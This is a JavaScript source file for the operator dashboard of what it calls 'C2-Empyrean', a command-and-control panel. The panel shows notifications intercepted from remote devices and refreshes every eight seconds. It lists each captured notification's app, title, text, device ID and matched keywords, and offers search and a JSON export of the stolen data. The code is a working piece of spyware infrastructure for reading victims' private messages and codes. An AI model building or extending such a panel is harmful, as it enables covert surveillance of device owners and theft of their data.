/**
 * C2-Empyrean - Real-time Notification Viewer
 * Live-updating notification interception display
 */

let allNotifications = [];
let autoRefresh = null;

document.addEventListener('DOMContentLoaded', function() {
    loadNotifications();
    autoRefresh = setInterval(loadNotifications, 8000);
});

async function loadNotifications() {
    try {
        const result = await API.get('/notifications/fetch?page=1&per_page=50');
        if (!result || !result.success) {
            if (result && result.code === 401) { window.location.href = '/admin/login'; return; }
            return;
        }

        allNotifications = result.data.notifications || [];
        document.getElementById('totalCount').textContent = 'Total: ' + (result.data.pagination?.total || 0);
        renderNotifications(allNotifications);
    } catch (err) {}
}

function renderNotifications(notifs) {
    const grid = document.getElementById('notifGrid');
    if (!grid) return;

    if (notifs.length === 0) {
        grid.innerHTML = '<div class="empty-state">No notifications captured yet</div>';
        return;
    }

    grid.innerHTML = notifs.map(n => `
        <div class="notif-card">
            <div class="notif-header">
                <span class="notif-app">${escapeHtml(n.package_name || n.app_name || 'unknown')}</span>
                <span class="notif-time">${timeAgo(n.timestamp)}</span>
            </div>
            <div class="notif-title">${escapeHtml(n.title || '')}</div>
            <div class="notif-text">${escapeHtml(n.text || n.body || '')}</div>
            <div class="notif-device">${escapeHtml(n.device_id || '')}</div>
            ${n.keywords ? '<div class="notif-keywords">🔍 ' + escapeHtml(n.keywords) + '</div>' : ''}
        </div>
    `).join('');
}

function filterNotifications() {
    const q = document.getElementById('searchInput')?.value?.toLowerCase() || '';
    if (!q) {
        renderNotifications(allNotifications);
        return;
    }
    const filtered = allNotifications.filter(n =>
        (n.title || '').toLowerCase().includes(q) ||
        (n.text || n.body || '').toLowerCase().includes(q) ||
        (n.package_name || '').toLowerCase().includes(q) ||
        (n.device_id || '').toLowerCase().includes(q)
    );
    renderNotifications(filtered);
}

function clearNotifications() {
    allNotifications = [];
    renderNotifications([]);
}

function exportNotifications() {
    if (allNotifications.length === 0) return;
    const data = JSON.stringify(allNotifications, null, 2);
    const blob = new Blob([data], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'notifications_export_' + Date.now() + '.json';
    a.click();
    URL.revokeObjectURL(url);
}
